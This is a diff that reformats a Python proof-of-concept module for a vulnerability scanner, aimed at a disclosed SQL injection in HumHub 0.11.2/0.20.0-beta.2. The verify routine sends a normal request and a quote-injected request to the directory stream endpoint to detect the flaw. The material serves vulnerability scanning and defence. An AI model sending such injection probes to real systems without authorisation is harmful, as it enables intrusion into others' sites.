@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'HumHub_0001' # 平台漏洞编号，留空
+    vuln_id = 'HumHub_0001'  # 平台漏洞编号，留空
     name = 'HumHub 0.11.2/0.20.0-beta.2 - SQL Injection'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-11-30'  # 漏洞公布时间
     desc = '''
         While conducting an internal software evaluation, LSE Leading
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'HumHub'  # 漏洞应用名称
     product_version = '0.11.2/0.20.0-beta.2'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '69e2809b-5488-4fe5-9630-e24ad71679e1'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             payload1 = '/index.php?r=directory/directory/stream&limit=4&sort=c&from=5&mode=normal'
             payload2 = '/index.php?r=directory/directory/stream&limit=4&sort=c&from=5%27%22&mode=normal'
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
